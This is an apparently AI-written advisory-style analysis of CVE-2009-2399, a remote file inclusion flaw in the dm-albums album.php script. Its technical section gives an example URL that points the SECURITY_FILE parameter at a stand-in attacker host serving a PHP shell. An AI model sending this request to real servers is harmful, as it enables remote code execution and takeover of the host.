Based on the provided information, here's an analysis of CVE-2009-2399:

**Vulnerability Details:**

*   **Root Cause:** The vulnerability is due to a Remote File Inclusion (RFI) vulnerability in the `album.php` file within the `dm-albums/template` directory of the dm FileManager application.
*   **Weakness:** The `SECURITY_FILE` parameter in `album.php` is not properly sanitized or validated, allowing an attacker to include a remote file.
*   **Impact:** An attacker can exploit this vulnerability to include a malicious PHP script (e.g., a shell) from a remote server. This would allow the attacker to execute arbitrary code on the server hosting the vulnerable dm FileManager application, potentially leading to complete compromise of the system.
*  **Attack Vector:** The attack vector is through an HTTP GET request to the vulnerable `album.php` file. The attacker would specify a URL to a malicious PHP file in the `SECURITY_FILE` parameter.
*   **Required Attacker Capabilities/Position:**
    *   The attacker needs to have network access to the server hosting the vulnerable dm FileManager application.
    *   The attacker needs to control a server from which the malicious PHP script can be fetched by the vulnerable application.

**Technical Details**

*   The vulnerable URL is: `http://[sitename]/[path]/dm-albums/template/album.php?SECURITY_FILE=http://attackersite/shell.php`
*   The exploit involves injecting a URL into the `SECURITY_FILE` parameter, pointing to a malicious PHP script controlled by the attacker.

**Additional Information:**

*   The vulnerable application is dm FileManager version 3.9.4.
*   The exploit was published on Exploit-DB on 2009-06-29.

This vulnerability is a classic example of a Remote File Inclusion, where the lack of input validation allows an attacker to force the server to include and execute code from a remote source.
